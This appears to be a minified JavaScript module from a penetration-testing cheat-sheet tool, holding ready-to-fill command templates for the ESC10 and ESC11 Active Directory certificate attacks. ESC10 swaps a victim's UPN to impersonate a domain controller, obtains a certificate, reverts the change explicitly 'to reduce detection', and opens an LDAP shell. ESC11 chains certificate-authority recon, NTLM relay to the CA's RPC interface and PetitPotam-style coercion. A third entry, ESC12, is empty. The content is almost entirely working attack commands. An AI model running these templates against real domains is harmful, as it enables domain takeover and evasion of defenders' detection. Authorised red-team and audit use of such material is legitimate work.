const e=[{title:"ESC10",description:"ESC10: Weak Certificate Mapping for Schannel Authentication",template:`## 1) (Optional) Read the victim account's current UPN so you can restore it later

certipy account -u '{attacker}@{domain}' -p '{attacker_pass}' -dc-ip '{dc_ip}' -user '{victim}' read

## 2) Update the victim's UPN to the target machine's sAMAccountName (e.g., DC$@domain)

certipy account -u '{attacker}@{domain}' -p '{attacker_pass}' -dc-ip '{dc_ip}' -user '{victim}' -upn '{target_sam_upn}' update

## 3) Obtain or prepare Kerberos credentials for the victim (save to a ccache). Example using impacket-getTGT (alternatives possible)

impacket-getTGT '{domain}/{victim}:{lifetime}@{atime}'

## 4) Point your environment to the victim's ccache so certipy uses the victim's context for enrollment

export KRB5CCNAME={victim}.ccache

## 5) Request a client authentication certificate as the victim (Kerberos auth via ccache). Use an enrollable template (e.g., 'User')

certipy req -k -dc-ip '{dc_ip}' -target '{ca_host}' -ca '{ca_name}' -template '{template_name}' -ns {ns_ip} -dns-tcp -timeout 10 -dc-host {dc_host}

## 6) Revert the victim's UPN to its original value to avoid breaking functionality and reduce detection

unset KRB5CCNAME

certipy account -u '{attacker}@{domain}' -p '{attacker_pass}' -dc-ip '{dc_ip}' -user '{victim}' -upn '{original_upn}' update

## 8) Authenticate to LDAPS (Schannel) using the issued PFX; if the DC maps by UPN, you may be mapped to the target machine account

certipy auth -pfx '{pfx_file}' -dc-ip '{dc_ip}' -ldap-shell`},{title:"ESC11",description:"ESC11: NTLM Relay to AD CS RPC Interface",template:`# 1)Recon — confirm CA RPC encryption policy (certipy find shows ESC11 if RPC encryption is not enforced)

certipy find -target {ca_target} -u '{username}@{domain}' -p '{password}' -k -vulnerable -stdout

# 2) Start Certipy relay targeting the CA RPC interface (ESC11)

certipy relay -target 'rpc://{ca_ip_or_host}' -ca '{ca_name}' -template '{template_name}'

# If permission denied listening on port 445 on Linux, allow unprivileged ports:

echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start

# 3)use netexec coerce_plus to try common coercion vectors (PetitPotam / DFSCoerce / PrinterBug)

netexec smb {victim_host} -u '{victim_user}' -p '{victim_pass}' -k -M coerce_plus

netexec smb {victim_host} -u '{victim_user}' -p '{victim_pass}' -k -M coerce_plus -o LISTENER={listener} METHOD=PetitPotam

# Monitor certipy relay output for request/issuance and saved PFX

## 4) Use the obtained PFX to authenticate (Kerberos or other flows) or extract credentials

certipy auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC12 — YubiHSM2 / HSM-related risk (safe guidance)",description:"",template:""}],t={commands:e};export{e as commands,t as default};
